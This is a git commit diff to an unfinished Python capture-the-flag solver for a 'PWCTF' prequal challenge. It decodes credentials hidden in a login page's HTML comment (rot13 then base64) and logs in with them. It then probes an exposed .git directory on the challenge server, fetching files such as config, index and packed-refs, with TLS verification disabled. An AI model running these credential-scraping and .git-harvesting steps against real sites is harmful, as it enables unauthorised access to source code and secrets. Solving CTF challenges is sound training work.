c9ae9a3014d9d3f2eebbf013c99d92dfc548f156
Hamster of Doom <team-bipolar@protonmail.com>
2018-01-29 23:55:37 +0200

    Added new CTF. Good luck all!

--- PWCTF/Prequal/main.py
+++ PWCTF/Prequal/main.py
@@ -1,14 +1,22 @@
 import re
-
+import string
 import requests
-
+import json
 
 class Solution:
+
     @staticmethod
-    def solve():
+    def aux_rot13(code):
+        rot13 = string.maketrans(
+            "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz",
+            "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
+        return string.translate(code, rot13)
+
+    def solve(self):
         # Get the login page
         challenge_link = r"https://prequal.pwctf.com/login.php"
-        page = requests.get(challenge_link, verify=False).content
+        challenge_session = requests.session()
+        page = challenge_session.get(challenge_link, verify=False).content
 
         # Extract the raw data
         regex = re.compile(r"CTF\?\ (.*)\ -->")
@@ -23,8 +31,28 @@ class Solution:
 
         raw_decoded = base64_code.decode("base64")
 
-        # To be continued ...
+        json_credentials = Solution.aux_rot13(base64_code).decode("base64")
 
+        credentials = json.loads(json_credentials)
+
+        post_creds = {
+                'username':credentials['username'],
+                'password':credentials['password']
+                }
+
+        login_response = challenge_session.post(challenge_link, data=post_creds, verify=False).content
+
+        print login_response
+
+        README = challenge_session.get("https://prequal.pwctf.com//readme-src/74956b12-22e0-42d4-96ae-f2da7ef2f9c6/README.md", verify=False).content
+
+        interesting_files = ["HEAD", "config", "description", "index", "packed-refs", "info/exclude", "logs/HEAD", "objects"]
+        for interesting_file in interesting_files:
+            dot_git = challenge_session.get("https://prequal.pwctf.com//readme-src/74956b12-22e0-42d4-96ae-f2da7ef2f9c6/.git/{}".format(interesting_file), verify=False).content
+            print interesting_file
+            print dot_git
+
+        # To be continued ...
 
 if __name__ == '__main__':
     me = Solution()
